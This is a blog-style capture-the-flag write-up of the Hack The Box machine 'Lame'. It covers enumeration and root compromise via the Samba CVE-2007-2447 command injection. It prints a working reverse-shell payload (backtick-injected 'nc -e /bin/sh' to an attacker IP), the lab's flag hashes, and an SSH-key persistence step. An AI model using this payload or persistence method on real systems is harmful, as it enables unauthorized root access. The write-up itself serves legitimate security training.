# Lame

Executive Summary

***

### 📜 Walking the Ancient Paths: 🕸️Rooting Legacy Infrastructure

![](https://cdn-images-1.medium.com/max/800/1*dcKtYHm9RE5yeHuFNqLITw.png)

### Executive Summary

**Target:** _Lame (Hack The Box)_ **OS:** _Linux_ **Difficulty:** _Easy_ **Attack Vectors:** _Samba Misconfiguration (CVE-2007–2447) -> Command Injection -> Unauthenticated Root RCE._

This assessment targeted “**Lame,**” a Linux-based machine running legacy services. The initial foothold — and immediate root compromise — was achieved by identifying a critical vulnerability in the Samba file sharing service (**CVE-2007–2447**). This vulnerability allowed for unauthenticated Arbitrary Command Execution via shell metacharacters in the username field. By leveraging this flaw during an **SMB** login attempt, we bypassed standard authentication and instantly gained unrestricted administrative (Root) access to the host.

### 1.0 Initial Foothold

### 1.1 Reconnaissance & Enumeration

#### 1.1.1 Nmap Scan Analysis

The assessment began with a full TCP port scan using Nmap to identify all open services and gather version information on the target 10.10.10.3.

```
──(nicholas㉿Nicholas)-[~/HTB/Labs/Lame]
└─$ nmap -sV -sC -p- -A -vvv 10.10.10.3
<SNIP>
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
<SNIP>
```

#### 1.1.2 Key Findings

* **Port 21 (FTP):** **`vsftpd 2.3.4`** (Anonymous login confirmed).
* **Port 139/445 (SMB):** **`Samba smbd 3.0.20-Debian`** (Critical).
* **Port 3632 (Distcc):** **`distccd v1`** (Secondary RCE vector).
* **Service Discovery:** The Nmap scan identifies the OS as _Unix (Samba 3.0.20-Debian)_ and reveals the **`hackthebox.gr`** domain name.

#### 1.2 Service Enumeration

#### 1.2.1 Analysis

We identified two high-probability vectors: **`distccd`** on port 3632 (vulnerable to CVE-2004-2687) and **`Samba`** on port 445. We prioritized the Samba vector as it typically provides direct **`root`** access, whereas **`distccd`** often yields a low-privileged **`daemon`** shell.

#### 1.2.2 Version Fingerprinting

We validated the Samba version using **`smbclient`** to ensure the Nmap banner was accurate.

```
smbclient -L //10.10.10.3
Password for [WORKGROUP\nicholas]:
Anonymous login successful

 Sharename       Type      Comment
 ---------       ----      -------
 print$          Disk      Printer Drivers
 tmp             Disk      oh noes!
 opt             Disk
 IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
 ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

 Server               Comment
 ---------            -------

 Workgroup            Master
 ---------            -------
 WORKGROUP            LAME
```

#### 1.2.3 Output Analysis

The server allowed **Anonymous Login**, revealing the following shares:

* **print$:** Printer drivers (Disk).
* **tmp:** Comment “oh noes!” (Disk) — **Primary Target**.
* **opt:** Optional software packages (Disk).
* **IPC$ / ADMIN$:** IPC Services.

1. **2.4 Key Finding:** The presence of the **`tmp`** share with the suspicious "oh noes!" comment suggests it is the intended path for interaction. We verified the server version again in the footer: **`Samba 3.0.20-Debian`**.

### 2.0 Initial Shell & Root Compromise (Exploitation)

Now we execute the attack. We will connect to the **`tmp`** share and use the **`logon`** command to trigger the CVE-2007-2447 exploit.

**Step 1: Start your Listener (Term 1)** Open a new terminal tab and start Netcat to catch the shell.

```
──(nicholas㉿Nicholas)-[~/HTB/Labs/Lame]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Step 2: Trigger the Exploit (Term 2)** In your current terminal, connect to the **`tmp`** share and send the malicious username payload.

```
─(nicholas㉿Nicholas)-[~/HTB/Labs/Lame]
└─$ smbclient //10.10.10.3/tmp
Password for [WORKGROUP\nicholas]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "/=`nohup nc -e /bin/sh 10.10.14.24 4444`"
Password:
session setup failed: NT_STATUS_IO_TIMEOUT
smb: \>
```

**Key Findings:**

* **Privilege Level:** The **`uid=0(root)`** confirms that the Samba daemon was running with administrative privileges, and our injected command inherited those permissions.
* **No Lateral Movement Needed:** Unlike modern systems where we often land as a low-privileged user (e.g., **`www-data`**), this legacy vulnerability granted immediate system-wide control.

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.3] 51927
id
uid=0(root) gid=0(root)
```

### 3.0 Post-Exploitation

### 3.1 Flag Capture

With root access, we can now retrieve the objective flags. Run these commands in your root shell to get the “loot”:

```
cat /home/makis/user.txt
3a7ad2294b0ee2e1a356c7f41f2adfa4
cat /root/root.txt
d68895d92912196c3b1c5963826a4acc
```

### 3.2 Persistence (Optional)

If this were a red team engagement, we would now establish persistence.

* **SSH Key Injection:** We could generate an SSH keypair on our attacker machine (**`ssh-keygen`**) and echo the public key into **`/root/.ssh/authorized_keys`** to allow login without re-exploiting Samba.

### 4.0 Final Thoughts: The Red Team Mandate

Throughout this assessment of “Lame,” we demonstrated that a chain is only as strong as its oldest link. We didn’t need to brute-force SSH or compromise the FTP service. We identified a 15-year-old vulnerability (CVE-2007–2447) in the Samba service that was left unpatched.

We utilized the **“Ancient Paths”** approach — checking for legacy misconfigurations before attempting complex modern exploits. This resulted in a complete system compromise in under 5 minutes of active engagement.

#### 4.1 spiritual connection

**Proverbs 25:19**

> _“Like a broken tooth or a lame foot is reliance on the unfaithful in a time of trouble.”_

### How it ties into the machine:

1. **The Name:** The machine is literally named “**Lame**.” The verse speaks directly to the concept of a “lame foot” — something that structure and weight are supposed to rest on, but which fails immediately under pressure.
2. **The Exploit:** The system administrators relied on **Samba 3.0.20** to handle file sharing securely. However, outdated software is “unfaithful” — it cannot be trusted.
3. **The Result:** In the “time of trouble” (our penetration test), that reliance caused the system to collapse. Just as a lame foot cannot support a body, the unpatched Samba service could not support the security posture of the server, leading to an immediate root compromise.

![](https://cdn-images-1.medium.com/max/800/1*tcHn8n_H00Y-VrK3PfdE8g.png)

### 🚀🚀Join the Mission🚀🚀

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

* Is there a specific tool you wish existed?
* Is there a hacking concept you want me to learn and explain?
* Do you have a “brick wall” you’re hitting in your own research?

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

[**Join the Iron-Breach Discord Server!**\
_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/8buAHtm2fK)

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [February 8, 2026](https://medium.com/p/48a10435ba07).

[Canonical link](https://medium.com/@nicholasmullenski/walking-the-ancient-paths-%EF%B8%8Frooting-legacy-infrastructure-48a10435ba07)

Exported from [Medium](https://medium.com) on September 1, 2026.
